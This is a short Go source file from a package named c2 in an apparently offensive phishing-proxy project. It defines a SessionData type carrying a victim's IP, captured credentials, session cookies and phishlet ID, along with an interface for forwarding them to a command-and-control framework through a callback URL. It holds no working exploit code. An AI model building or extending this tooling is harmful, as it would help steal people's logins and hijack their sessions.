package c2

import (
	"context"
	"time"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
)

// SessionData for C2 transfer
type SessionData struct {
	SessionID   string
	VictimIP    string
	Credentials *database.Credentials
	Cookies     []*database.Cookie
	PhishletID  string
	UserAgent   string
	TargetURL   string
}

// Adapter interface for C2 framework integration
type Adapter interface {
	Name() string
	IsAvailable(ctx context.Context) bool
	SendSession(ctx context.Context, data *SessionData) error
	SendCredentials(ctx context.Context, creds *database.Credentials, metadata map[string]string) error
	HealthCheck(ctx context.Context) error
}

// Config common C2 config
type Config struct {
	Enabled     bool
	CallbackURL string
	PollInterval time.Duration
}
